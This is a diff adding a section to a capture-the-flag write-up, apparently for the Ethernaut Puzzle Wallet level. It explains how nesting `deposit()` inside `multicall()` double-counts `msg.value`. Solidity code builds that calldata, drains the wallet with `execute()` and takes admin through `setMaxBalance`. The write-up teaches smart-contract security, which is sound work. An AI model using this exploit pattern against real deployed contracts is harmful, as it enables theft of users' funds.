@@ -1625,7 +1625,7 @@ How can we do this? With the following chain in reverse order
     * Since it has a control `require(msg.sender == owner, "Not the owner")`,
     * We make the player owner by exploiting the storage overlap at `function proposeNewAdmin(address _newAdmin) external`
 
-All nice and fancy, now, the problem with `setMaxBalance` is the following control:
+All nice and fancy. Now, the problem with `setMaxBalance` is the following control:
 
 ```solidity
 require(address(this).balance == 0, "Contract balance is not 0");
@@ -1633,9 +1633,71 @@ require(address(this).balance == 0, "Contract balance is not 0");
 
 Which we are going to address in the next sub section.
 
-#### Draining the balance of the Puzzle Wallet
+#### Draining the Puzzle Wallet
 
+Notice that `execute()` allows you to withdraw funds from the wallet.
 
+```solidity
+function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+  require(balances[msg.sender] >= value, "Insufficient balance");
+  balances[msg.sender] -= value;
+  (bool success, ) = to.call{ value: value }(data);
+  require(success, "Execution failed");
+}
+```
+
+Also there is a `deposit()` function
+
+```solidity
+function deposit() external payable onlyWhitelisted {
+  require(address(this).balance <= maxBalance, "Max balance reached");
+  balances[msg.sender] += msg.value;
+}
+```
+
+If `deposit()` is bundled twice into `multicall()`, it will in a way "reuse" `msg.value` in such a way that `balances[msg.sender]` will be a multiple of the actual sent value.
+
+As the wallet was initialized at the factory with `0.001 ether`, we could deposit `0.001 ether`, but trick the wallet into recording that we have instead `0.002 ether`. In this way we withdraw our funds and the wallet's, draining the wallet in the process.
+
+If we look at `multicall()` we realize there is indeed a control for calling the `deposit()` function twice within it, *but* there is no control for the `deposit()` function inside a `multicall()` function. In other words we are looking to bundle the calls like this:
+
+```
+multicall_0 - deposit
+            - multicall_1 - deposit
+```
+
+We compose the data in the following way
+
+```solidity
+// let's craft the deposit call
+bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
+
+// bundle deposit into into multicall_1
+bytes[] memory multicall1Params = new bytes[](1);
+multicall1Params[0] = depositCalldata;
+bytes memory multicall1CallData = abi.encodeWithSignature("multicall(bytes[])", multicall1Params);
+
+// bundle deposit (again) and multicall_1
+bytes[] memory multicall0Params = new bytes[](2);
+multicall0Params[0] = depositCalldata;    // reusing deposit
+multicall0Params[1] = multicall1CallData; // are you confused enough?
+```
+
+As we tricked the balance with the same deposit, twice, we can just drain
+
+```solidity
+// as our balance is 0.002, we can call execute(), draining the contract
+// don't forget to set up receive() in this contract
+bytes memory b;
+target.execute(address(this), 0.002 ether, b);
+```
+
+#### Complete the level
+
+```solidity
+// and now we can modify slot1 which is admin/maxBalance
+target.setMaxBalance(uint160(address(this)));
+```
 
 ### References
 
